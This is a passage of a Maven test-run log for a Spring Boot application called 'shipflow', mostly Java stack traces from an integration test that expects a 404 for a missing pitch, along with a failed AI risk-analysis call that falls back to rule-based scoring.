	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:198) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:169) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:93) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:58) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:141) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:57) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:103) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:85) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DelegatingLauncher.execute(DelegatingLauncher.java:47) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.apache.maven.surefire.junitplatform.LazyLauncher.execute(LazyLauncher.java:56) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.execute(JUnitPlatformProvider.java:184) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invokeAllTests(JUnitPlatformProvider.java:148) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invoke(JUnitPlatformProvider.java:122) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:385) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:507) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:495) ~[surefire-booter-3.1.2.jar:3.1.2]

2026-01-17T23:26:46.672Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.service.RiskAnalysisService      : AI analysis failed, falling back to rule-based: Failed to get response from RunPod: RunPod /run failed with status 500: {"messageKey":"error.generic","message":"An unexpected error occurred. Please try again.","timestamp":"2026-01-17T23:26:46.67114","status":500}
2026-01-17T23:26:46.672Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached pitch risk 65 (withAI=true, TTL=infinite)
2026-01-17T23:26:46.729Z ERROR 89700 --- [shipflow] [           main] c.g.f.s.e.GlobalExceptionHandler         : Unexpected runtime exception: Pitch not found with id: 99999

java.lang.RuntimeException: Pitch not found with id: 99999
	at com.github.farzadsedaghatbin.shipflow.service.PitchHealthService.lambda$getPitchHealth$0(PitchHealthService.java:174) ~[classes/:na]
	at java.base/java.util.Optional.orElseThrow(Optional.java:403) ~[na:na]
	at com.github.farzadsedaghatbin.shipflow.service.PitchHealthService.getPitchHealth(PitchHealthService.java:174) ~[classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(AopUtils.java:352) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.invokeJoinpoint(ReflectiveMethodInvocation.java:196) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:765) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.transaction.interceptor.TransactionInterceptor$1.proceedWithInvocation(TransactionInterceptor.java:123) ~[spring-tx-6.1.2.jar:6.1.2]
	at org.springframework.transaction.interceptor.TransactionAspectSupport.invokeWithinTransaction(TransactionAspectSupport.java:385) ~[spring-tx-6.1.2.jar:6.1.2]
	at org.springframework.transaction.interceptor.TransactionInterceptor.invoke(TransactionInterceptor.java:119) ~[spring-tx-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:184) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:765) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:717) ~[spring-aop-6.1.2.jar:6.1.2]
	at com.github.farzadsedaghatbin.shipflow.service.PitchHealthService$$SpringCGLIB$$0.getPitchHealth(<generated>) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.controller.PitchHealthController.getPitchHealth(PitchHealthController.java:33) ~[classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:262) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:190) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:118) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:917) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:829) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1089) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:979) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1014) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:903) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at jakarta.servlet.http.HttpServlet.service(HttpServlet.java:564) ~[tomcat-embed-core-10.1.17.jar:6.0]
	at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:885) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.TestDispatcherServlet.service(TestDispatcherServlet.java:72) ~[spring-test-6.1.2.jar:6.1.2]
	at jakarta.servlet.http.HttpServlet.service(HttpServlet.java:658) ~[tomcat-embed-core-10.1.17.jar:6.0]
	at org.springframework.mock.web.MockFilterChain$ServletFilterProxy.doFilter(MockFilterChain.java:165) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at com.github.farzadsedaghatbin.shipflow.security.MaliciousHeaderFilter.doFilter(MaliciousHeaderFilter.java:83) ~[classes/:na]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:110) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:108) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.FilterChainProxy.lambda$doFilterInternal$3(FilterChainProxy.java:231) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$FilterObservation$SimpleFilterObservation.lambda$wrap$1(ObservationFilterChainDecorator.java:479) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$AroundFilterObservation$SimpleAroundFilterObservation.lambda$wrap$1(ObservationFilterChainDecorator.java:340) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator.lambda$wrapSecured$0(ObservationFilterChainDecorator.java:82) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:128) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.access.intercept.AuthorizationFilter.doFilter(AuthorizationFilter.java:100) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:126) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:120) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:131) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:85) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:100) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:179) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:63) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at com.github.farzadsedaghatbin.shipflow.security.JwtAuthenticationFilter.doFilterInternal(JwtAuthenticationFilter.java:46) ~[classes/:na]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at com.github.farzadsedaghatbin.shipflow.security.MaliciousHeaderFilter.doFilter(MaliciousHeaderFilter.java:83) ~[classes/:na]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:107) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:93) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.CorsFilter.doFilterInternal(CorsFilter.java:91) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.header.HeaderWriterFilter.doHeadersAfter(HeaderWriterFilter.java:90) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.header.HeaderWriterFilter.doFilterInternal(HeaderWriterFilter.java:75) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.context.SecurityContextHolderFilter.doFilter(SecurityContextHolderFilter.java:82) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.context.SecurityContextHolderFilter.doFilter(SecurityContextHolderFilter.java:69) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter.doFilterInternal(WebAsyncManagerIntegrationFilter.java:62) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.session.DisableEncodeUrlFilter.doFilterInternal(DisableEncodeUrlFilter.java:42) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$AroundFilterObservation$SimpleAroundFilterObservation.lambda$wrap$0(ObservationFilterChainDecorator.java:323) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:224) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:233) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:191) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:113) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.handler.HandlerMappingIntrospector.lambda$createCacheFilter$3(HandlerMappingIntrospector.java:195) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:113) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CompositeFilter.doFilter(CompositeFilter.java:74) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.config.annotation.web.configuration.WebMvcSecurityConfiguration$CompositeFilterChainProxy.doFilter(WebMvcSecurityConfiguration.java:225) ~[spring-security-config-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:352) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:268) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.ServerHttpObservationFilter.doFilterInternal(ServerHttpObservationFilter.java:109) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.MockMvc.perform(MockMvc.java:201) ~[spring-test-6.1.2.jar:6.1.2]
	at com.github.farzadsedaghatbin.shipflow.controller.PitchHealthControllerIntegrationTest.getPitchHealth_ShouldReturn404_WhenPitchNotFound(PitchHealthControllerIntegrationTest.java:204) ~[test-classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:728) ~[junit-platform-commons-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:156) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestableMethod(TimeoutExtension.java:147) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestMethod(TimeoutExtension.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(InterceptingExecutableInvoker.java:103) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.lambda$invoke$0(InterceptingExecutableInvoker.java:93) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:92) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeTestMethod$7(TestMethodTestDescriptor.java:218) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeTestMethod(TestMethodTestDescriptor.java:214) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:139) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:69) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:151) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
